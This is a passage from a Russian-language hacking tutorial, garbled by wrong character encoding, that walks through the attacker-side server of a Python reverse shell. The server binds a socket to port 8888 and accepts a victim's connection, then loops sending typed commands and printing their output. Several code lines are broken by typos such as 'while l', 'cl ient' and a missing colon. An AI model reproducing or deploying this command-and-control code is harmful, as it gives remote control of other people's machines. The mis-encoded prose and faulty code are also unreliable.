—торона сервера (атакующего)
«десь все начинаетс€ абсолютно так же, как и в примерах выше.
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 8888))
s.listen(5)

≈динственное изменение - это IP адрес. (ќбрати iDONi на это внимание). ”казав одни нули, 
мы используем все IP, которые есть на нашей докальной машине. (зачем замудренного написать)
≈сли локальных адресов несколько, то сервер будет работать на любом из них. (конечно на 
практике у iDONi он не заработает, конечно это же iDONi)

ƒалее принимаем подключение и данные: в client будет новое подключение (сокет), а в addr будет
лежать адрес отправител€ (кто отправитель € же самоучка сама себе ех iDONi ех
когда же ты будешь коммуникативным, пусть настанет этот день аумин, аумин)

client, addr = s.accept()

“еперь основна€ часть:

while l:
	command = str(input('Enter command:'))
	client.send(command.encode())
	if command.lower() == 'exit'
		break
result_output = cl ient.recv(l024 ) .decode()
print(result_output)
client. close ()
s. close () 